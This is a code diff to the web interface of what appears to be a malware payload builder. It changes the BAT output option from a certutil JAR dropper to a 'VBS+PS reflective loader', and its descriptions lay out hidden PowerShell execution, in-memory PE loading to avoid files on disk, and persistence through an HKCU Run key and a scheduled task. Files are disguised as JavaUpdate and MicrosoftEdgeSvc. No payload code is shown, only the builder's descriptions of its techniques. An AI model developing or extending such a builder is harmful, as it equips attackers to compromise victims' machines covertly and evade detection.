@@ -257,7 +257,7 @@
     <div class="fmt-btn" data-fmt="bat">
       <div class="fmt-icon">📜</div>
       <div class="fmt-name">BAT</div>
-      <div class="fmt-desc">certutil JAR dropper</div>
+      <div class="fmt-desc">VBS+PS reflective loader</div>
     </div>
   </div>
 
@@ -308,7 +308,7 @@
   const dhDesc = {
     jar: '<b>Hook 1:</b> <code>static{}</code> initializer (fires on class load) · <b>Hook 2:</b> <code>main()</code> entry point · <b>Persist:</b> copies to <code>%APPDATA%\\JavaUpdate.exe</code> + HKCU Run key',
     exe: '<b>Hook 1:</b> Primary process spawn (hidden window) · <b>Hook 2:</b> Registers HKCU Run key via <code>reg add</code> so it re-runs on every login',
-    bat: '<b>Hook 1:</b> certutil drops + immediately runs JAR · <b>Hook 2:</b> Copies to <code>%APPDATA%\\JavaUpdate.jar</code> + HKCU Run key + ONLOGON Scheduled Task at highest privilege',
+    bat: '<b>Hook 1:</b> VBS spawns PS hidden → C# PE loader maps payload in memory (no EXE on disk) · <b>Hook 2:</b> Copies VBS to <code>%APPDATA%\\MicrosoftEdgeSvc.vbs</code> + HKCU Run key → <code>wscript /b</code> re-runs on every login',
   };
 
   // Drag & drop
